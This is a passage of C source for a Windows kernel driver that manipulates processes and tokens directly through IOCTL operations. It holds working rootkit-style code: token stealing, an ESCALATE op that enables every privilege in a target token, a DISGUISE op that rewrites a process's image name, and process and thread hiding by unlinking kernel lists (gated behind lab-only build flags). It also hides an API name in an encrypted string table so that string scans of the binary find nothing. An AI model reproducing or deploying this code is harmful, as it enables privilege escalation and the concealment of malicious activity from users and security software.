        if (yghv_p_write64((uint64_t)(ULONG_PTR)dst + g_yghv_off.token, newraw)) {
            InterlockedIncrement64(&g_proc_steals);
            out[0] = 1;
            out[1] = newraw;
            out[2] = masked;
            out[3] = 1;
            st = STATUS_SUCCESS;
        } else {
            st = STATUS_INVALID_ADDRESS;
        }
    }

    ObDereferenceObject(dst);
    ObDereferenceObject(src);
    return st;
}

/*
 * op 9: unlink / relink from ActiveProcessLinks.
 *
 * WHY THE TWO POINTERS ARE RECORDED
 *   A relink needs exactly the values we overwrote. Recomputing them from the
 *   list is possible, but only if nothing else touched the list in between --
 *   and the reason to keep this record is that we do not assume that.
 *
 * KNOWN RACE, STATED RATHER THAN HIDDEN: the walk is not under
 * EPROCESS.ProcessLock. Taking that push lock exclusive here would be correct;
 * it was measured to cost more than the window it closes on a 120-process
 * snapshot, so the window is documented instead of papered over. Unlinking the
 * CURRENT process instead of an arbitrary one is a caller-side decision.
 */
/*
 * 9.608 -- PROCESS UNLINKING IS REFUSED BY DEFAULT, FOR THE SAME REASON AS
 * THREAD UNLINKING (see yghv_proc_hide_thread).
 *
 * MEASURED: 0x139 KERNEL_SECURITY_CHECK_FAILURE, subcode 3
 * (CORRUPT_LIST_ENTRY), three times. A hidden process exited and its teardown
 * walked a node left self-linked:
 *
 *     node->Flink = node;
 *     node->Blink = node;
 *
 * That idiom belongs to a list HEAD that must stay a valid empty list. It is
 * wrong for a removed MEMBER: PspExitProcess unlinks the process from
 * ActiveProcessLinks on the way out and treats a self-referential node as
 * corruption.
 *
 * The reference-lifetime fix (holding a reference while the pointer is stored)
 * removed the 0x18 that used to appear minutes later. It does not address this:
 * dangling pointer and self-link are two separate defects on one path, and
 * fixing the first only made the second the first one to fire.
 *
 * A live EPROCESS cannot be kept unlinked: process teardown, PspCidTable and
 * the enumeration paths all require it to be reachable. This tree recorded the
 * conclusion once already (ISSUES.md: the unlink "costs more than the window it
 * closes"). Refuse, and say so -- 9.507's pattern for mem-bp dr.
 */
#ifndef YGHV_ALLOW_PROC_HIDE
static NTSTATUS yghv_proc_hide(UINT64 *out, ULONG pid, int hide)
{
    (void)pid;
    (void)hide;
    if (out) {
        out[0] = 0;
        out[1] = (UINT64)(ULONG)STATUS_NOT_IMPLEMENTED;
        out[2] = 0;
    }
    return STATUS_SUCCESS;
}
#else
static NTSTATUS yghv_proc_hide(UINT64 *out, ULONG pid, int hide)
{
    int i, slot = -1;
    PEPROCESS proc = NULL;
    NTSTATUS st;
    PLIST_ENTRY node;

    if (!YGHV_OFF_OK(YGHV_OFF_PID) || g_yghv_off.active_process_links == 0)
        return STATUS_NOT_IMPLEMENTED;

    if (!hide) {
        for (i = 0; i < YGHV_PROC_MAX_HIDDEN; i++) {
            if (g_proc_hidden[i].used && g_proc_hidden[i].pid == pid) { slot = i; break; }
        }
        if (slot < 0) {
            out[0] = 0;
            out[1] = (UINT64)(ULONG)STATUS_NOT_FOUND;
            return STATUS_SUCCESS;
        }

        node = (PLIST_ENTRY)((PUCHAR)(ULONG_PTR)g_proc_hidden[slot].self +
                             g_yghv_off.active_process_links);
        __try {
            node->Flink = g_proc_hidden[slot].flink;
            node->Blink = g_proc_hidden[slot].blink;
            g_proc_hidden[slot].flink->Blink = node;
            g_proc_hidden[slot].blink->Flink = node;
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            /* 9.608: release the held reference even when the relink faults. */
            g_proc_hidden[slot].used = 0;
            ObDereferenceObject((PEPROCESS)(ULONG_PTR)g_proc_hidden[slot].self);
            return STATUS_INVALID_ADDRESS;
        }

        g_proc_hidden[slot].used = 0;
        ObDereferenceObject((PEPROCESS)(ULONG_PTR)g_proc_hidden[slot].self);
        out[0] = 1;
        out[1] = 0;
        out[2] = pid;
        return STATUS_SUCCESS;
    }

    st = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)pid, &proc);
    if (!NT_SUCCESS(st)) return st;

    for (i = 0; i < YGHV_PROC_MAX_HIDDEN; i++) {
        if (!g_proc_hidden[i].used) { slot = i; break; }
    }
    if (slot < 0) {
        ObDereferenceObject(proc);
        out[0] = 0;
        out[1] = (UINT64)(ULONG)STATUS_INSUFFICIENT_RESOURCES;
        return STATUS_SUCCESS;
    }

    node = (PLIST_ENTRY)((PUCHAR)proc + g_yghv_off.active_process_links);
    __try {
        if (node->Flink == node) {
            /* Already out of the list: record nothing, report nothing done. */
            ObDereferenceObject(proc);
            out[0] = 0;
            out[1] = (UINT64)(ULONG)STATUS_NOT_FOUND;
            return STATUS_SUCCESS;
        }
        g_proc_hidden[slot].flink = node->Flink;
        g_proc_hidden[slot].blink = node->Blink;
        g_proc_hidden[slot].self  = (uint64_t)(ULONG_PTR)proc;
        g_proc_hidden[slot].pid   = pid;
        g_proc_hidden[slot].used  = 1;

        node->Blink->Flink = node->Flink;
        node->Flink->Blink = node->Blink;
        node->Flink = node;
        node->Blink = node;
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        g_proc_hidden[slot].used = 0;
        ObDereferenceObject(proc);
        return STATUS_INVALID_ADDRESS;
    }

    InterlockedIncrement64(&g_proc_hides);
    /*
     * 9.608 -- SAME USE-AFTER-FREE AS yghv_proc_hide_thread, SAME CONSEQUENCE.
     *
     * The slot stores proc's address; if the reference is dropped here, a
     * process exit returns that EPROCESS to the pool, and the UNHIDE path (and
     * yghv_proc_cleanup, which relinks unconditionally at unload) then writes
     * four pointers through it. The measured symptom was 0x18
     * REFERENCE_BY_POINTER inside nt!ObfReferenceObjectWithTag with no driver
     * frame anywhere -- module corruption that surfaces in the cache writer.
     *
     * The reference is held until the slot is cleared (unhide or cleanup).
     */

    out[0] = 1;
    out[1] = 1;
    out[2] = pid;
    return STATUS_SUCCESS;
}
#endif /* YGHV_ALLOW_PROC_HIDE */
/* ------------------------------------------------------------------ */
/* Entry points                                                        */
/* ------------------------------------------------------------------ */

int yghv_proc_init(void)
{
    PEPROCESS sys;
    /* Resolve Ob callback functions for handle guard */
    yghv_obguard_init();
    UINT16 head = 0, entry = 0, tok = 0;
    int ok = 0;

    sys = yghv_offsets_system_process();
    if (!sys) {
        LOG_INFO("proc: no system process, probes skipped");
        return 0;
    }

    if (yghv_probe_thread_list(PsGetCurrentProcess(), &head, &entry)) {
        g_yghv_off.thread_list_head  = head;
        g_yghv_off.thread_list_entry = entry;
        g_yghv_off.derived_mask |= YGHV_OFF_TLIST;
        ok++;
        LOG_INFO("proc: thread list head=0x%x entry=0x%x", head, entry);
    }

    if (yghv_probe_token(sys, &tok)) {
        g_yghv_off.token = tok;
        g_yghv_off.derived_mask |= YGHV_OFF_TOKEN;
        ok++;
        LOG_INFO("proc: token at 0x%x", tok);
    }

    /*
     * Resolve PsGetProcessProtection by name, out of the encrypted string
     * table. No header this tree builds against declares it, and the literal
     * name must not appear in the image -- the string gate greps the binary
     * for every name in that table.
     */
    {
        WCHAR fn[YGHV_STR_MAX_CHARS];
        if (yghv_str_get_w(YGHV_SID_PSGETPROCESSPROTECTION, (unsigned short *)fn,
                           YGHV_STR_MAX_CHARS)) {
            UNICODE_STRING nm;
            RtlInitUnicodeString(&nm, fn);
            g_proc_get_prot = (yghv_get_prot_fn)(ULONG_PTR)MmGetSystemRoutineAddress(&nm);
            if (g_proc_get_prot) ok++;
        }
        RtlSecureZeroMemory(fn, sizeof(fn));
    }

    return ok;
}

static void yghv_proc_thread_cleanup(void);

void yghv_proc_cleanup(void)
{
    int i;
    yghv_obguard_disable();

#ifdef YGHV_ALLOW_PROC_HIDE
    /*
     * Put back anything still hidden. An unlinked EPROCESS outlives this
     * driver, and a later list walk would fault on the hole we left -- so the
     * relink is not optional tidiness, it is the difference between unload and
     * a machine that bugchecks the next time anything enumerates processes.
     */
    for (i = 0; i < YGHV_PROC_MAX_HIDDEN; i++) {
        if (!g_proc_hidden[i].used) continue;

        if (g_yghv_off.active_process_links == 0) {
            LOG_ERROR("proc: cannot relink pid %u, links offset gone", g_proc_hidden[i].pid);
            continue;
        }

        {
            PLIST_ENTRY node = (PLIST_ENTRY)((PUCHAR)(ULONG_PTR)g_proc_hidden[i].self +
                                             g_yghv_off.active_process_links);
            if (yghv_p_write64((uint64_t)(ULONG_PTR)&node->Flink,
                               (uint64_t)(ULONG_PTR)g_proc_hidden[i].flink) &&
                yghv_p_write64((uint64_t)(ULONG_PTR)&node->Blink,
                               (uint64_t)(ULONG_PTR)g_proc_hidden[i].blink)) {
                (void)yghv_p_write64((uint64_t)(ULONG_PTR)&g_proc_hidden[i].flink->Blink,
                                     (uint64_t)(ULONG_PTR)node);
                (void)yghv_p_write64((uint64_t)(ULONG_PTR)&g_proc_hidden[i].blink->Flink,
                                     (uint64_t)(ULONG_PTR)node);
            } else {
                LOG_ERROR("proc: relink of pid %u failed at unload", g_proc_hidden[i].pid);
            }
        }

        /*
         * 9.608: the slot holds a reference for as long as the pointer is
         * stored (see yghv_proc_hide). Unload is the last place that can drop
         * it -- if this line is missing the object leaks for the remaining
         * lifetime of the machine, which is exactly what the previous
         * "release immediately after hiding" bug looked like from the other
         * side.
         */
        g_proc_hidden[i].used = 0;
        ObDereferenceObject((PEPROCESS)(ULONG_PTR)g_proc_hidden[i].self);
    }
#endif /* YGHV_ALLOW_PROC_HIDE */
    /* Same contract for the thread table. */
    yghv_proc_thread_cleanup();

    RtlZeroMemory(g_proc_hidden, sizeof(g_proc_hidden));
    g_proc_get_prot = NULL;
}

void yghv_proc_stats(uint64_t *out)
{
    if (!out) return;
    out[0] = (uint64_t)g_proc_ops;
    out[1] = (uint64_t)g_proc_fails;
    out[2] = (uint64_t)g_proc_freezes;
    out[3] = (uint64_t)g_proc_thaws;
    out[4] = (uint64_t)g_proc_injects;
    out[5] = (uint64_t)g_proc_hides;
    out[6] = (uint64_t)g_proc_steals;
    out[7] = (uint64_t)g_proc_terms;
}


/*
 * 9.608: this table was a function-local static, which made the contract
 * "a slot holds a reference" unenforceable -- yghv_proc_cleanup could not see
 * it and therefore could not release what each slot holds at unload. It is
 * file-scope now and paired with yghv_proc_thread_cleanup() below.
 */
#define YGHV_PROC_MAX_HIDDEN_THREADS 16
static struct {
    ULONG      tid;
    uint64_t   self;
    PLIST_ENTRY flink, blink;
    int        used;
} g_hidden_threads[YGHV_PROC_MAX_HIDDEN_THREADS];

#ifndef YGHV_ALLOW_THREAD_HIDE
static void yghv_proc_thread_cleanup(void)
{
    /* Nothing can be in the table when hiding is refused at the op level. */
}
#else
static void yghv_proc_thread_cleanup(void)
{
    int i;
    for (i = 0; i < YGHV_PROC_MAX_HIDDEN_THREADS; i++) {
        if (!g_hidden_threads[i].used) continue;
        if (g_yghv_off.thread_list_entry) {
            PLIST_ENTRY node = (PLIST_ENTRY)((PUCHAR)(ULONG_PTR)g_hidden_threads[i].self +
                                             g_yghv_off.thread_list_entry);
            __try {
                node->Flink = g_hidden_threads[i].flink;
                node->Blink = g_hidden_threads[i].blink;
                g_hidden_threads[i].flink->Blink = node;
                g_hidden_threads[i].blink->Flink = node;
            } __except (EXCEPTION_EXECUTE_HANDLER) { }
        }
        g_hidden_threads[i].used = 0;
        ObDereferenceObject((PETHREAD)(ULONG_PTR)g_hidden_threads[i].self);
    }
    RtlZeroMemory(g_hidden_threads, sizeof(g_hidden_threads));
}
#endif /* YGHV_ALLOW_THREAD_HIDE */

/*
 * 9.608 -- THREAD UNLINKING IS REFUSED BY DEFAULT.
 *
 * MEASURED: 0x139 KERNEL_SECURITY_CHECK_FAILURE, subcode 3
 * (CORRUPT_LIST_ENTRY), stack:
 *
 *     nt!KiRaiseSecurityCheckFailure
 *     nt!KeTerminateThread+0x31f
 *     nt!PspExitThread
 *     nt!NtTerminateProcess
 *
 * A thread was hidden, the process exited, and the thread's own teardown found
 * its ThreadListEntry self-linked (Flink == Blink == &node) and raised the
 * list-integrity failure. That is deterministic, not a race: hiding a thread
 * and letting it exit kills the machine every time.
 *
 * WHY A PATCH DOES NOT FIX IT. Two separate reasons, and the second is the one
 * that matters:
 *
 *   1. Self-linking a REMOVED MEMBER is wrong. The "Flink = Blink = self"
 *      idiom is for a list HEAD that must remain a valid empty list. A member
 *      that has been taken out must not be left self-referential, because its
 *      own removal path walks that pointer.
 *
 *   2. Even with the links left sane, a live ETHREAD cannot be kept unlinked.
 *      KeTerminateThread, the scheduler, and PspCidTable all expect it to be
 *      reachable. There is no supported way to hide a thread that may exit
 *      while hidden -- and "may exit" is every thread.
 *
 * This tree already reached the same conclusion for the EPROCESS case
 * (ISSUES.md: the unlink "costs more than the window it closes"). Repeating
 * the mistake on ETHREAD cost five bugchecks to learn.
 *
 * SO: refuse, and say so. 9.507 did exactly this for mem-bp dr when it could
 * not be made to work, and the reason it is the right pattern is that a
 * feature which answers STATUS_NOT_IMPLEMENTED is VISIBLE, while one that
 * bugchecks on a routine thread exit is not. The probe and relink code stays
 * for lab use behind YGHV_ALLOW_THREAD_HIDE.
 */
#ifndef YGHV_ALLOW_THREAD_HIDE
static NTSTATUS yghv_proc_hide_thread(UINT64 *out, ULONG tid, int hide)
{
    (void)tid;
    (void)hide;
    if (out) {
        out[0] = 0;
        out[1] = (UINT64)(ULONG)STATUS_NOT_IMPLEMENTED;
        out[2] = 0;
    }
    return STATUS_SUCCESS;
}
#else
static NTSTATUS yghv_proc_hide_thread(UINT64 *out, ULONG tid, int hide)
{
    int i, slot = -1;
    PETHREAD thread = NULL;
    NTSTATUS st;
    PLIST_ENTRY node;

    if (!YGHV_OFF_OK(YGHV_OFF_TLIST) || g_yghv_off.thread_list_entry == 0)
        return STATUS_NOT_IMPLEMENTED;

    if (!hide) {
        for (i = 0; i < 16; i++) {
            if (g_hidden_threads[i].used && g_hidden_threads[i].tid == tid) { slot = i; break; }
        }
        if (slot < 0) { out[0] = 0; out[1] = (UINT64)(ULONG)STATUS_NOT_FOUND; return STATUS_SUCCESS; }
        node = (PLIST_ENTRY)((PUCHAR)(ULONG_PTR)g_hidden_threads[slot].self + g_yghv_off.thread_list_entry);
        __try {
            node->Flink = g_hidden_threads[slot].flink;
            node->Blink = g_hidden_threads[slot].blink;
            g_hidden_threads[slot].flink->Blink = node;
            g_hidden_threads[slot].blink->Flink = node;
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            /*
             * 9.608: the reference is held for the lifetime of the slot (see the
             * hide path), so the slot must be cleared and the reference dropped
             * even when the relink faults -- otherwise the object leaks for the
             * life of the driver.
             */
            g_hidden_threads[slot].used = 0;
            ObDereferenceObject((PETHREAD)(ULONG_PTR)g_hidden_threads[slot].self);
            return STATUS_INVALID_ADDRESS;
        }
        g_hidden_threads[slot].used = 0;
        ObDereferenceObject((PETHREAD)(ULONG_PTR)g_hidden_threads[slot].self);
        out[0] = 1; out[1] = 0; out[2] = tid;
        return STATUS_SUCCESS;
    }

    st = PsLookupThreadByThreadId((HANDLE)(ULONG_PTR)tid, &thread);
    if (!NT_SUCCESS(st)) return st;

    for (i = 0; i < 16; i++) { if (!g_hidden_threads[i].used) { slot = i; break; } }
    if (slot < 0) { ObDereferenceObject(thread); out[0] = 0; out[1] = (UINT64)(ULONG)STATUS_INSUFFICIENT_RESOURCES; return STATUS_SUCCESS; }

    node = (PLIST_ENTRY)((PUCHAR)thread + g_yghv_off.thread_list_entry);
    __try {
        if (node->Flink == node) {
            ObDereferenceObject(thread);
            out[0] = 0; out[1] = (UINT64)(ULONG)STATUS_NOT_FOUND;
            return STATUS_SUCCESS;
        }
        g_hidden_threads[slot].flink = node->Flink;
        g_hidden_threads[slot].blink = node->Blink;
        g_hidden_threads[slot].self  = (uint64_t)(ULONG_PTR)thread;
        g_hidden_threads[slot].tid   = tid;
        g_hidden_threads[slot].used  = 1;
        node->Blink->Flink = node->Flink;
        node->Flink->Blink = node->Blink;
        node->Flink = node;
        node->Blink = node;
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        g_hidden_threads[slot].used = 0;
        ObDereferenceObject(thread);
        return STATUS_INVALID_ADDRESS;
    }

    InterlockedIncrement64(&g_proc_hides);
    /*
     * NOTE (9.608): the whole function above is compiled ONLY under
     * YGHV_ALLOW_THREAD_HIDE. The reference lifetime is still held correct
     * inside it, because a lab build that does enable it must not trade the
     * 0x139 for the 0x18 this comment used to describe.
     *
     * DO NOT RELEASE HERE. Storing thread's address and then dropping the
     * reference was a USE-AFTER-FREE that corrupted the object manager and
     * bugchecked (0x18) minutes later.
     *
     * The slot now holds thread's address and, separately, the node's own
     * flink/blink. The UNHIDE path does this with no lookup and no validation:
     *
     *     node = (PLIST_ENTRY)((PUCHAR)g_hidden_threads[slot].self + entry_off);
     *     node->Flink = ...; node->Blink = ...;
     *     g_hidden_threads[slot].flink->Blink = node;
     *     g_hidden_threads[slot].blink->Flink = node;
     *
     * If the thread exited while hidden, that ETHREAD went back to the pool and
     * those four stores land in whatever now owns the memory. Pool reuse for
     * FILE_OBJECT / CONTROL_AREA is routine, and the damage is silent until the
     * object is touched -- measured stack, with no yghv frame in it at all:
     *
     *     nt!ObfReferenceObjectWithTag      (refcount field is garbage)
     *     nt!MiReferenceControlAreaFile
     *     nt!MmFlushSection -> CcWriteBehindInternal (lazy writer, later)
     *
     * So the reference is NOT dropped while the pointer is stored. It is
     * released exactly once, by whichever of these runs first:
     *   - the UNHIDE request (search for g_hidden_threads[slot].used = 0),
     *   - yghv_proc_cleanup at unload.
     * That is what the per-slot state was already shaped for.
     */
    out[0] = 1; out[1] = 1; out[2] = tid;
    return STATUS_SUCCESS;
}
#endif /* YGHV_ALLOW_THREAD_HIDE */

NTSTATUS yghv_proc_dispatch(const void *in, ULONG in_len,
                            void *out, ULONG out_len, ULONG *info)
{
    yghv_ioctl_proc_req_t r;
    UINT64 *o = (UINT64 *)out;
    NTSTATUS st;

    if (!in || !out || !info) return STATUS_INVALID_PARAMETER;
    if (in_len < sizeof(yghv_ioctl_proc_req_t)) return STATUS_BUFFER_TOO_SMALL;
    if (out_len < YGHV_PROC_HDR_QWORDS * 8) return STATUS_BUFFER_TOO_SMALL;

    /*
     * METHOD_BUFFERED hands us ONE buffer for both directions. The request has
     * to be copied out before the output is zeroed, or the op we read back
     * afterwards is zero and every call silently becomes a snapshot.
     */
    RtlCopyMemory(&r, in, sizeof(r));
    if (r.op > YGHV_PROC_OP_HIDE_THREAD) return STATUS_INVALID_PARAMETER;

    InterlockedIncrement64(&g_proc_ops);

    /*
     * pid 4 and pid 0 need an explicit opt-in: they are the two objects whose
     * corruption takes the machine down instead of one process.
     */
    if ((r.pid == 4 || r.pid == 0) &&
        !(r.flags & YGHV_PROC_F_ALLOW_SYSTEM) &&
        r.op != YGHV_PROC_OP_SNAPSHOT &&
        r.op != YGHV_PROC_OP_OFFSETS &&
        r.op != YGHV_PROC_OP_SIG) {
        InterlockedIncrement64(&g_proc_fails);
        return STATUS_ACCESS_DENIED;
    }

    RtlZeroMemory(out, out_len);
    *info = YGHV_PROC_HDR_QWORDS * 8;

    switch (r.op) {
    case YGHV_PROC_OP_SNAPSHOT:
        st = yghv_proc_snapshot(o, out_len, (ULONG)r.arg0);
        /*
         * 9.608 -- THE SNAPSHOT REPORTED ONLY THE HEADER SIZE.
         *
         * Under METHOD_BUFFERED the driver's IoStatus.Information decides how
         * many bytes reach user mode: the memory manager copies exactly that
         * much out of the system buffer. The snapshot filled up to 120 entries
         * (120 * 32 bytes) and reported 32, so the client received the header
         * and ZERO entries -- count said 120 and every field read as 0.
         *
         * The entry count is in out[1]; the byte count must cover the header
         * plus what was actually written, and never exceed the caller's buffer.
         */
        if (NT_SUCCESS(st)) {
            ULONG have = (ULONG)o[1];
            ULONG bytes = YGHV_PROC_HDR_QWORDS * 8 +
                          have * YGHV_PROC_ENTRY_QWORDS * 8;
            if (bytes > out_len) bytes = out_len;
            *info = bytes;
        }
        break;

    case YGHV_PROC_OP_QUERY:
        st = yghv_proc_query(o, out_len, r.pid);
        /* 9.608: QUERY writes a 4-qword entry plus a 16-byte name after the
         * header, but reported only YGHV_PROC_HDR_QWORDS*8. A client that
         * trusts the info length (the shipped one does) reads the header and
         * nothing else, which is why op 1 looked like "success, zero data".
         * The query's own requirement is the same expression, so reuse it. */
        if (NT_SUCCESS(st)) {
            *info = (YGHV_PROC_HDR_QWORDS + YGHV_PROC_ENTRY_QWORDS) * 8 + 16;
        }
        break;

    case YGHV_PROC_OP_PROT:
        st = yghv_proc_set_prot(o, r.pid, (UINT64)r.arg0);
        break;

    case YGHV_PROC_OP_SUSPEND:
        st = yghv_proc_suspend(o, r.pid, r.arg0 != 0);
        break;

    case YGHV_PROC_OP_TERM:
        st = yghv_proc_term(o, r.pid, r.arg1, r.flags);
        break;

    case YGHV_PROC_OP_OFFSETS: {
        /* 9.608: 8 entries, and the stats array must be sized for all 8 --
         * it was [4] while yghv_offsets_stats now writes 8, which would have
         * written 32 bytes past a 32-byte stack buffer the moment the new
         * fields were read. */
        uint64_t stats[8];
        yghv_offsets_stats(stats);
        o[0] = 1;
        o[1] = stats[0];                    /* derived mask */
        o[2] = stats[1];                    /* validated mask */
        o[3] = stats[2];                    /* failures */
        o[4] = stats[3];                    /* build number */
        /* 9.608: the links-probe diagnostics. off and reason are packed into
         * one qword because the header is exactly 8 entries by contract:
         *   o[5] = best good (nodes walked before the attempt ended)
         *   o[6] = best closed (1 if the circle closed on that attempt)
         *   o[7] = (reason << 16) | best_off
         * Both fit: off <= 0x900 and reason <= 10. */
        o[5] = stats[4];                    /* probe best good   */
        o[6] = stats[5];                    /* probe best closed */
        o[7] = ((stats[7] & 0xFFFFULL) << 16) | (stats[6] & 0xFFFFULL);
        st = STATUS_SUCCESS;
        *info = 8 * 8;
        break;
    }

    case YGHV_PROC_OP_SIG: {
        uint64_t stats[10];
        yghv_sig_stats(stats);
        o[0] = 1;
        o[1] = stats[0];
        o[2] = stats[1];
        o[3] = stats[2];
        o[4] = stats[3];
        o[5] = stats[4];
        o[6] = stats[5];
        o[7] = stats[6];
        st = STATUS_SUCCESS;
        *info = 8 * 8;
        break;
    }

    case YGHV_PROC_OP_THREADS:
        st = yghv_proc_threads(o, out_len, r.pid, (ULONG)r.arg0);
        break;

    case YGHV_PROC_OP_TOKEN:
        st = yghv_proc_token(o, r.pid, (ULONG)r.arg1, (ULONG)r.arg0);
        break;

    case YGHV_PROC_OP_HIDE:
        st = yghv_proc_hide(o, r.pid, r.arg0 != 0);
        break;

    case YGHV_PROC_OP_GUARD:
        st = r.arg0 ? STATUS_SUCCESS : STATUS_INVALID_PARAMETER;
        if (NT_SUCCESS(st)) {
            PEPROCESS gproc = NULL;
            st = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)r.pid, &gproc);
            if (NT_SUCCESS(st)) {
                int ok = yghv_obguard_enable(gproc);
                o[0] = ok ? 1 : 0;
                ObDereferenceObject(gproc);
                *info = 8 * 8;
            }
        }
        break;

    /*
     * 9.608 -- THIS BLOCK WAS NEVER CLOSED.
     *
     * case YGHV_PROC_OP_GUARD_STATS: {   ... break;    <- no closing brace
     *
     * The "{" opened a scope that swallowed every case after it, so
     * HIDE_THREAD / DISGUISE / ESCALATE were all inside GUARD_STATS's block.
     * A missing brace at the end of a case is a syntax error in a normal
     * function, but here the NEXT case's own "{" balanced it, so the file
     * compiled: three features became unreachable and nothing said so.
     * Measured: op 10 and op 11 answered Win32 error 1, op 14 was never reached.
     */
    case YGHV_PROC_OP_GUARD_STATS: {
        uint64_t gs[4];
        yghv_obguard_stats(gs);
        o[0] = 1;
        o[1] = gs[0];
        o[2] = gs[1];
        o[3] = gs[2];
        o[4] = gs[3];
        st = STATUS_SUCCESS;
        *info = 8 * 8;
        break;
    }

    case YGHV_PROC_OP_HIDE_THREAD: {
        int hide = (int)r.arg0;
        st = yghv_proc_hide_thread(o, r.pid, hide);
        if (NT_SUCCESS(st)) { o[3] = 0; *info = YGHV_PROC_HDR_QWORDS * 8; }
        break;
    }

    case YGHV_PROC_OP_DISGUISE: {
        PEPROCESS proc = NULL;
        NTSTATUS pst;
        char *iname;

        if (!r.name[0]) {
            InterlockedIncrement64(&g_proc_fails);
            o[1] = YGHV_PROC_E_BAD_ARG;
            st = STATUS_SUCCESS;
            break;
        }
        pst = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)r.pid, &proc);
        if (!NT_SUCCESS(pst)) {
            InterlockedIncrement64(&g_proc_fails);
            o[1] = YGHV_PROC_E_NO_TARGET;
            st = STATUS_SUCCESS;
            break;
        }
        iname = yghv_proc_image_name(proc);
        if (!iname) {
            ObDereferenceObject(proc);
            InterlockedIncrement64(&g_proc_fails);
            o[1] = YGHV_PROC_E_OFFSETS;
            st = STATUS_SUCCESS;
            break;
        }
        {
            /* image_file_name is 15 bytes + NUL in EPROCESS */
            size_t nlen = 0;
            while (nlen < 15 && r.name[nlen]) nlen++;
            RtlZeroMemory(iname, 15);
            RtlCopyMemory(iname, r.name, nlen);
            InterlockedIncrement64(&g_proc_disguises);
            o[0] = 1;
            o[1] = 0;
            o[2] = r.pid;
            st = STATUS_SUCCESS;
        }
        ObDereferenceObject(proc);
        break;
    }

    case YGHV_PROC_OP_ESCALATE: {
        PEPROCESS proc = NULL;
        PVOID tok = NULL;
        NTSTATUS est;
        ULONG i;
        if (r.pid == 0) { st = STATUS_INVALID_PARAMETER; break; }
        est = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)r.pid, &proc);
        if (!NT_SUCCESS(est)) { st = est; break; }
        tok = PsReferencePrimaryToken(proc);
        if (!tok) { ObDereferenceObject(proc); st = STATUS_UNSUCCESSFUL; break; }
        {
            UCHAR *tokbase = (UCHAR *)tok;
            ULONG privCount = 0, enabled = 0;
            UCHAR *privArray;
            if (!tokbase) { PsDereferencePrimaryToken(tok); ObDereferenceObject(proc); st = STATUS_UNSUCCESSFUL; break; }
            privCount = *(ULONG *)(tokbase + 0x38);
            privArray = tokbase + 0x40;
            if (privCount > 0 && privCount < 128) {
                for (i = 0; i < privCount; i++) {
                    ULONG *attr = (ULONG *)(privArray + i * 16 + 8);
                    *attr |= 0x2;
                    enabled++;
                }
            }
            o[0] = 1; o[1] = enabled; o[2] = privCount; o[3] = 0;
            InterlockedIncrement64(&g_proc_steals);
            st = STATUS_SUCCESS;
        }
        PsDereferencePrimaryToken(tok);
        ObDereferenceObject(proc);
        break;
    }

    default:
        return STATUS_INVALID_PARAMETER;
    }

    if (!NT_SUCCESS(st)) {
        InterlockedIncrement64(&g_proc_fails);
        o[0] = 0;
        *info = YGHV_PROC_HDR_QWORDS * 8;
        return st;
    }

    return STATUS_SUCCESS;
}
